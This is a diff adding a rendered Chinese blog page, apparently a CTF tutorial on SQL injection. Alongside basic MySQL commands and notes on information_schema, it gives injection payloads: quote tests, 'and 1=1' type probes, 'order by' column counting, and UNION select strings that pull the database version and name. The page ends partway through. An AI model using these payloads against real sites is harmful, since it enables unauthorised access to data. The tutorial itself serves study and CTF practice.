@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Dunm1e">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/09/11/f366e274d4aa/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="sql注入（web界面）进入mysql命令行 123show databases; # 显示所有数据库use database_name; # 进入某个数据库show tables; # 显示所有表名  增删改查12345678910111213141516171819202122# 向数据库插入数据insert into 表名(字段1,字段2,...) values(值1,值2,...);# e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入（web界面）">
+<meta property="og:url" content="http://example.com/2024/09/11/f366e274d4aa/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入（web界面）进入mysql命令行 123show databases; # 显示所有数据库use database_name; # 进入某个数据库show tables; # 显示所有表名  增删改查12345678910111213141516171819202122# 向数据库插入数据insert into 表名(字段1,字段2,...) values(值1,值2,...);# e">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-11T10:55:45.000Z">
+<meta property="article:modified_time" content="2024-09-12T00:18:24.248Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-B18L9QTZ0H"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-B18L9QTZ0H');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo_dunm1e.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_dunm1e.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/logo_dunm1e.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            sql注入（web界面） | Dunm1e &#39; s World
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e ' s World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.png","dark":"/images/dark.jpg"},"title":"Dunm1e ' s World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","About":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱\n后面更新AI教程 \n 敬请关注","show_on_mobile":true,"links":{"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Welcome to Dunm1e &#39; s World!
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/logo_dunm1e.png" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Dunm1e &#39; s World
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://github.com/dunm1e"
+                                        >
+                                    <i class="fa-brands fa-github fa-fw"></i>
+                                    GITHUB
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/categories">
+                                                    CATEGORIES
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/tags">
+                                                    TAGS
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links">
+                                                    ABOUT
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://github.com/dunm1e"
+                        >
+                            <span>
+                                GITHUB
+                            </span>
+                            
+                                <i class="fa-brands fa-github fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-Links"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories">CATEGORIES</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/tags">TAGS</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links">ABOUT</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">sql注入（web界面）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/touxiang.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Dunm1e</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-09-11 18:55:45</span>
+        <span class="mobile">2024-09-11 18:55:45</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-12 08:18:24</span>
+            <span class="mobile">2024-09-12 08:18:24</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/CTF/Web/">Web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sql/">sql</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="sql注入（web界面）"><a href="#sql注入（web界面）" class="headerlink" title="sql注入（web界面）"></a>sql注入（web界面）</h1><p>进入mysql命令行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases; # 显示所有数据库</span><br><span class="line">use database_name; # 进入某个数据库</span><br><span class="line">show tables; # 显示所有表名</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 向数据库插入数据</span><br><span class="line">insert into 表名(字段1,字段2,...) values(值1,值2,...);</span><br><span class="line"># example</span><br><span class="line">insert into guestbook(comment,name) values(&#x27;welcome&#x27;,&#x27;web&#x27;);</span><br><span class="line"></span><br><span class="line"># 修改数据库的数据</span><br><span class="line">update 表名 set 字段名=&quot;值&quot; [where 条件];</span><br><span class="line"># example</span><br><span class="line">update guestbook set comment = &#x27;I love study&#x27;;</span><br><span class="line">update guestbook set comment = &#x27;I love study&#x27; where name=&#x27;web14&#x27;;</span><br><span class="line"></span><br><span class="line"># 向数据库查询数据</span><br><span class="line">select * from 表名;</span><br><span class="line">select */字段 from 表名 [where 条件]; # *表示全部</span><br><span class="line"># example</span><br><span class="line">select * from guestbook;</span><br><span class="line">select name,comment from guestbook where comment_id=2;</span><br><span class="line"></span><br><span class="line"># 删除数据库的数据</span><br><span class="line">delete from 表名 where 条件; # 必须有where条件</span><br><span class="line"># example</span><br><span class="line">delete from guestbook where comment_id=2;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Information-schema数据库"><a href="#Information-schema数据库" class="headerlink" title="Information_schema数据库"></a>Information_schema数据库</h3><ol>
+<li><h3 id="CHARACTER-SETS-表"><a href="#CHARACTER-SETS-表" class="headerlink" title="CHARACTER_SETS 表"></a>CHARACTER_SETS 表</h3><p>提供了 mysql 可用字符集的信息。<code>SHOW CHARACTER SET;</code> 命令从这个表获取结果。</p>
+</li>
+<li><h3 id="SCHEMATA-表"><a href="#SCHEMATA-表" class="headerlink" title="&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;当前 mysql 实例中所有数据库的信息。<code>SHOW DATABASES;</code> 命令从这个表获取数据。&#x3D;&#x3D;</p>
+</li>
+<li><h3 id="TABLES-表"><a href="#TABLES-表" class="headerlink" title="&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。<code>SHOW TABLES FROM XX;</code> 命令从这个表获取结果。&#x3D;&#x3D;</p>
+</li>
+<li><h3 id="COLUMNS-表"><a href="#COLUMNS-表" class="headerlink" title="&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;存储表中的列信息，包括表有多少列、每个列的类型等。<code>SHOW COLUMNS FROM schemaname.tablename</code> 命令从这个表获取结果。&#x3D;&#x3D; </p>
+</li>
+<li><h3 id="USER-PRIVILEGES-表"><a href="#USER-PRIVILEGES-表" class="headerlink" title="USER_PRIVILEGES 表"></a>USER_PRIVILEGES 表</h3><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
+</li>
+</ol>
+<blockquote>
+<p>其余查看<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/kikajack/article/details/80065753" >MySQL 中的 information_schema 数据库_object ‘profiling’ not found within ‘information_s-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="sql注入语句"><a href="#sql注入语句" class="headerlink" title="sql注入语句"></a>sql注入语句</h2><h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1. 判断是否存在漏洞"></a>1. 判断是否存在漏洞</h3><p>根据客户端返回的结果判断提交的测试语句 是否执行成功，如果被执行，则可能存在漏洞</p>
+<p>一般利用&#x3D;&#x3D;单引号和双引号&#x3D;&#x3D;来判断，如果SQL语句出现错误说明有很大可能存在漏洞。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里加上单引号语句报错，则可能存在漏洞</p>
+<p>后端向数据库获取数据的语句</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;$id&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-判断注入类型"><a href="#2-判断注入类型" class="headerlink" title="2. 判断注入类型"></a>2. 判断注入类型</h3><h4 id="字符型或者数字型"><a href="#字符型或者数字型" class="headerlink" title="字符型或者数字型"></a>字符型或者数字型</h4><p>涉及注入中是否加入单引号，可以使用&#x3D;&#x3D;and&#x3D;&#x3D;进行判断，当and两边都为真才是真。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br><span class="line"># 字符型</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;1 and 1=1&#x27;;</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;1 and 1=2&#x27;;</span><br><span class="line"># 数字型</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= 1 and 1=1;</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= 1 and 1=2;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果两个返回结果相同则为字符型，否则就是数字型。字符型会进行隐式类型转换，这是自动调用的，将某种类型的数据转换成另外一种类型数据。如上面的user_id是int型，但是输入字符型就会转换为int型。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1 and 1=1&#x27; ==&gt; 1</span><br><span class="line">&#x27;2admin&#x27; ==&gt; 2</span><br><span class="line">&#x27;admin&#x27; ==&gt; 0</span><br><span class="line">&#x27;33admin&#x27; ==&gt; 33</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1. 判断列数"></a>1. 判断列数</h3><p>利用&#x3D;&#x3D;order by&#x3D;&#x3D;</p>
+<p>判断后端的查询语句的输出有几列</p>
+<p>ORDER BY是表示输出的字段按照某一列进行排序，可以跟字段名，也可以跟列号</p>
+<p>如果为字符型</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1# </span><br><span class="line"># 上面的单引号是跟前面的单引号闭合，然后因为后面还有个单引号，所以需要井号来进行注释</span><br><span class="line">注 ：如果是GET型注入，可以利用井号的url编码%23进行注释或者利用--+</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-确定显示位"><a href="#2-确定显示位" class="headerlink" title="2. 确定显示位"></a>2. 确定显示位</h3><p>利用union将两个语句进行连接并输出</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users union SELECT password,last_name FROM users</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>上面五行是前一个语句的输出，后面五行是后一个语句的输出。</p>
+<blockquote>
+<p>注：</p>
+<ol>
+<li><p>输出结果的列名总是第一个语句中的列名</p>
+</li>
+<li><p>UNION内部语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时每条SELECT语句中的列的顺序也必须相同</p>
+</li>
+</ol>
+</blockquote>
+<p>如果某些网站只能回显一条数据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></div>
+
+<p>就是将第一个语句查询为空</p>
+<h3 id="3-获取数据信息"><a href="#3-获取数据信息" class="headerlink" title="3.  获取数据信息"></a>3.  获取数据信息</h3><h4 id="3-1-获取数据库名、版本"><a href="#3-1-获取数据库名、版本" class="headerlink" title="3.1 获取数据库名、版本"></a>3.1 获取数据库名、版本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure></div>
+
